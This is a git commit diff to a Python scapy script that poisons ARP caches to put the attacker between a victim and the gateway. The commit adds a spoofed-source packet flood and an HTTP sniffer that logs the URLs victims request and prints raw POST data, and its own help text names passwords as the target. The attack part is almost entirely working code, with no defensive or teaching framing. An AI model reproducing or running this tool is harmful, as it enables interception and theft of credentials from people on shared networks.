28c6e9c1fd1b308c501b742d1f1d19004753c01c
logbasetwo <mjb@balogh-family.com>
2021-05-01 14:33:23 -0400

    Added sniff and process packet functions + parsing for HTTP port 80 sniffing

--- script.py
+++ script.py
@@ -36,7 +36,38 @@ def reARP():
 def trick(gm, vm):
     send(ARP(op = 2, pdst = victimIP, psrc = gateIP, hwdst= vm))
     send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst= gm))
- 
+    send(IP(src=victimIP, dst=gateIP)/ICMP()/"Hello World")
+    send(IP(src=victimIP, dst=gateIP)/TCP(sport=80, dport=80), packets=10000)
+
+def sniff_packets(iface=None):
+    """
+    Sniff port 80 packets with 'iface'
+    """
+    if iface: # (http)
+        sniff(filter="port 80", prn=process_packet, iface=iface, store=False)
+        # 'process_packet' is the callback
+    else:
+        sniff(filter="port 80", prn=process_packet, store=False)
+        # default interface
+       
+def process_packet(packet):
+    """
+    This function is executed whenever a packet is sniffed
+    """
+    if packet.haslayer(HTTPRequest):
+        # if this packet is an HTTP Request
+        # get the requested URL
+        url = packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()
+        # get the requester's IP Address
+        ip = packet[IP].src
+        # get the request method
+        method = packet[HTTPRequest].Method.decode()
+        print(f"\n{GREEN}[+] {ip} Requested {url} with {method}{RESET}")
+        if show_raw and packet.haslayer(Raw) and method == "POST":
+            # if show_raw flag is enabled, has raw data, and the requested method is "POST"
+            # then show raw
+            print(f"\n{RED}[*] Some useful Raw data: {packet[Raw].load}{RESET}")
+            
 def mitm():
     try:
         victimMAC = get_mac(victimIP)
@@ -61,3 +92,14 @@ def mitm():
             reARP()
             break
 mitm()
+
+import argparse
+parser = argparse.ArgumentParser(description="HTTP Packet Sniffer, this is useful when you're a man in the middle." \
+                                    + "It is suggested that you run arp spoof before you use this script, otherwise it'll sniff your personal packets")
+parser.add_argument("-i", "--iface", help="Interface to use, default is scapy's default interface")
+parser.add_argument("--show-raw", dest="show_raw", action="store_true", help="Whether to print POST raw data, such as passwords, search queries, etc.")
+# parse arguments
+args = parser.parse_args()
+iface = args.iface
+show_raw = args.show_raw
+sniff_packets(iface)
